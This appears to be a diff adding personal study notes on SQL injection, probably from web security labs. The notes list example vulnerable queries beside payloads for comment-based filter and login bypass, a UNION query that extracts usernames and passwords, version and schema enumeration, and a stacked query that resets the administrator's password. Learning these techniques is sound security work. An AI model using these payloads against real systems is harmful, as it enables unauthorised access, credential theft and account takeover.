@@ -1,0 +1,17 @@
+=== SQL INJECTION ===
+https://website.com/products?category=Gifts -> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+>> Gifts'--
+SELECT * FROM users WHERE username = 'administrator' AND password = 'password'
+>> administrator'--
+SELECT name, description FROM products WHERE category = 'Gifts'
+>> ' UNION SELECT username, password FROM users--
+>> SELECT * FROM v$version
+>> SELECT * FROM information_schema.tables
+
+OTHER PARTS OF QUERY
+- UPDATE, INSERT, SELECT, SELECT (ORDER BY)
+
+>> badguy';update users set password='letmein' where user='administrator'--
+
+=== AUTHENTICATION ===
+
